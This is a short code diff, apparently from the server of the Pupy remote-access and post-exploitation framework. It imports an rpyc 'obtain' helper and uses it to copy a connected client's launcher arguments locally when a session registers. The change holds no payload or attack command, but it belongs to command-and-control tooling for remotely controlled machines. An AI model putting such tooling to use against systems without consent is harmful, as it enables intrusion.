@@ -24,6 +24,7 @@ from .PupyErrors import PupyModuleExit, PupyModuleError
 from .PupyJob import PupyJob
 from .PupyCmd import color_real
 from network.conf import transports
+from pupylib.utils.rpyc_utils import obtain
 
 try:
 	import ConfigParser as configparser
@@ -142,7 +143,7 @@ class PupyServer(threading.Thread):
 				"pid" : l[7],
 				"address" : conn._conn._config['connid'].split(':')[0],
 				"launcher" : conn.get_infos("launcher"),
-				"launcher_args" : conn.get_infos("launcher_args"),
+				"launcher_args" : obtain(conn.get_infos("launcher_args")),
 			}, self))
 			if self.handler:
 				addr = conn.modules['pupy'].get_connect_back_host()
